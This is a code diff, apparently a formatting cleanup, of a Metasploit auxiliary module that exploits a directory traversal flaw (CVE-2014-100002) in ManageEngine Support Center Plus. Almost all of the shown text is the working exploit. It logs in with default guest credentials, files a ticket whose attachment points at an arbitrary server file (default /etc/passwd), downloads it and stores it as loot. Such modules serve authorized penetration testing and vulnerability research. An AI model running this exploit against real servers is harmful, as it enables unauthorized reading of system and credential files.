@@ -8,29 +8,31 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'           => "ManageEngine Support Center Plus Directory Traversal",
-      'Description'    => %q{
-        This module exploits a directory traversal vulnerability found in ManageEngine
-        Support Center Plus build 7916 and lower. The module will create a support ticket
-        as a normal user, attaching a link to a file on the server. By requesting our
-        own attachment, it's possible to retrieve any file on the filesystem with the same
-        privileges as Support Center Plus is running. On Windows this is always with SYSTEM
-        privileges.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         => 'xistence <xistence[at]0x90.nl>', # Discovery, Metasploit module
-      'References'     =>
-        [
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'ManageEngine Support Center Plus Directory Traversal',
+        'Description' => %q{
+          This module exploits a directory traversal vulnerability found in ManageEngine
+          Support Center Plus build 7916 and lower. The module will create a support ticket
+          as a normal user, attaching a link to a file on the server. By requesting our
+          own attachment, it's possible to retrieve any file on the filesystem with the same
+          privileges as Support Center Plus is running. On Windows this is always with SYSTEM
+          privileges.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => 'xistence <xistence[at]0x90.nl>', # Discovery, Metasploit module
+        'References' => [
           ['CVE', '2014-100002'],
           ['EDB', '31262'],
           ['OSVDB', '102656'],
           ['BID', '65199'],
           ['PACKETSTORM', '124975']
         ],
-      'DisclosureDate' => '2014-01-28'
-    ))
+        'DisclosureDate' => '2014-01-28'
+      )
+    )
 
     register_options(
       [
@@ -39,29 +41,30 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('USER', [true, 'The Support Center Plus user', 'guest']),
         OptString.new('PASS', [true, 'The Support Center Plus password', 'guest']),
         OptString.new('FILE', [true, 'The Support Center Plus password', '/etc/passwd'])
-      ])
+      ]
+    )
   end
 
   def run_host(ip)
     uri = target_uri.path
     peer = "#{ip}:#{rport}"
 
-    vprint_status("Retrieving cookie")
+    vprint_status('Retrieving cookie')
     res = send_request_cgi({
       'method' => 'GET',
-      'uri'    => normalize_uri(uri, "")
+      'uri' => normalize_uri(uri, '')
     })
 
-    if res and res.code == 200
+    if res && (res.code == 200)
       session = res.get_cookies
     else
-      vprint_error("Server returned #{res.code.to_s}")
+      vprint_error("Server returned #{res.code}")
     end
 
     vprint_status("Logging in as user [ #{datastore['USER']} ]")
     res = send_request_cgi({
       'method' => 'POST',
-      'uri'    => normalize_uri(uri, "j_security_check"),
+      'uri' => normalize_uri(uri, 'j_security_check'),
       'cookie' => session,
       'vars_post' =>
       {
@@ -73,10 +76,10 @@ class MetasploitModule < Msf::Auxiliary
       }
     })
 
-    if res and res.code == 302
-      vprint_status("Login succesful")
+    if res && (res.code == 302)
+      vprint_status('Login succesful')
     else
-      vprint_error("Login was not succesful!")
+      vprint_error('Login was not succesful!')
       return
     end
 
@@ -84,7 +87,7 @@ class MetasploitModule < Msf::Auxiliary
     vprint_status("Creating ticket with our requested file [ #{datastore['FILE']} ] as attachment")
     res = send_request_cgi({
       'method' => 'POST',
-      'uri'    => normalize_uri(uri, "WorkOrder.do"),
+      'uri' => normalize_uri(uri, 'WorkOrder.do'),
       'cookie' => session,
       'vars_post' =>
         {
@@ -109,27 +112,27 @@ class MetasploitModule < Msf::Auxiliary
           'autoCCList' => '',
           'addWO' => 'addWO'
         }
-      })
+    })
 
-    if res and res.code == 200
-      vprint_status("Ticket created")
-      if (res.body =~ /FileDownload.jsp\?module=Request\&ID=(\d+)\&authKey=(.*)\" class=/)
-        fileid = $1
+    if res && (res.code == 200)
+      vprint_status('Ticket created')
+      if (res.body =~ /FileDownload.jsp\?module=Request&ID=(\d+)&authKey=(.*)" class=/)
+        fileid = ::Regexp.last_match(1)
         vprint_status("File ID is [ #{fileid} ]")
-        fileauthkey = $2
+        fileauthkey = ::Regexp.last_match(2)
         vprint_status("Auth Key is [ #{fileauthkey} ]")
       else
-        vprint_error("File ID and AuthKey not found!")
+        vprint_error('File ID and AuthKey not found!')
       end
     else
-      vprint_error("Ticket not created due to error!")
+      vprint_error('Ticket not created due to error!')
       return
     end
 
     vprint_status("Requesting file [ #{uri}workorder/FileDownload.jsp?module=Request&ID=#{fileid}&authKey=#{fileauthkey} ]")
     res = send_request_cgi({
       'method' => 'GET',
-      'uri' => normalize_uri(uri, "workorder", "FileDownload.jsp"),
+      'uri' => normalize_uri(uri, 'workorder', 'FileDownload.jsp'),
       'vars_get' =>
       {
         'module' => 'Request',
@@ -140,7 +143,7 @@ class MetasploitModule < Msf::Auxiliary
 
     # If we don't get a 200 when we request our malicious payload, we suspect
     # we don't have a shell, either.  Print the status code for debugging purposes.
-    if res and res.code == 200
+    if res && (res.code == 200)
       data = res.body
       p = store_loot(
         'manageengine.supportcenterplus',
@@ -151,8 +154,7 @@ class MetasploitModule < Msf::Auxiliary
       )
       print_good("[ #{datastore['FILE']} ] loot stored as [ #{p} ]")
     else
-      vprint_error("Server returned #{res.code.to_s}")
+      vprint_error("Server returned #{res.code}")
     end
   end
 end
-
